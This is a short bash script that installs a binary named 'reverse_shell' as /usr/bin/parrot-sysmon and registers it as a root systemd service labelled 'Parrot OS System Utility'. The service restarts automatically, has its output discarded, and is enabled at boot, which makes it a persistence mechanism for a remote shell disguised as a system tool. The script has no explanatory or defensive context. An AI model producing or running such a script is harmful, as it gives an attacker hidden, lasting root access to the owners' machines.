#!/bin/bash
sudo cp reverse_shell /usr/bin/parrot-sysmon
sudo chmod +x /usr/bin/parrot-sysmon
sudo bash -c 'cat > /etc/systemd/system/parrot-sysmon.service << EOF
[Unit]
Description=Parrot OS System Utility
After=network.target

[Service]
ExecStart=/usr/bin/parrot-sysmon
Restart=always
StandardOutput=null
StandardError=null
User=root

[Install]
WantedBy=multi-user.target
EOF'
sudo systemctl daemon-reload
sudo systemctl enable parrot-sysmon.service
sudo systemctl start parrot-sysmon.service > /dev/null 2>&1
